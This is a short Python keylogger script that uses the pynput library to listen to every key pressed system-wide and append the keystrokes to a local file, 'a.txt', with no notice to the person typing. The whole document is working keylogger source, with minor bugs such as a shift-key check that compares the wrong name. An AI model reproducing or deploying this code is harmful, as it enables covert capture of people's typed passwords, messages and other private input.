

from pynput.keyboard import Key,Listener

keys=[]
def on_press(key):
    try:
        key=str(key)
        if(key=='Key.enter'):
            key='\n'
        elif(key=='Key.space'):
            key=' '
        elif(key=='Key.alt'):
            key=' alt '
        elif(key=='Key.ctrl'):
            key=' ctrl '
        elif(key=='Key.backspace'):
            key=' backspace '
        elif(Key=='Key.shift'):
            key=' shift '
        f=open('a.txt','a') 
        key=key.strip('\'')
        f.write(key)
    except Exception as e:
        print(e)
        f.close()
    #print("{0} pressed".format(key))


#def on_release(key):
#    if(key==Key.esc):
#        return False
try:
    with Listener(on_press=on_press) as listener:
        listener.join()
except:
    print('\n...')
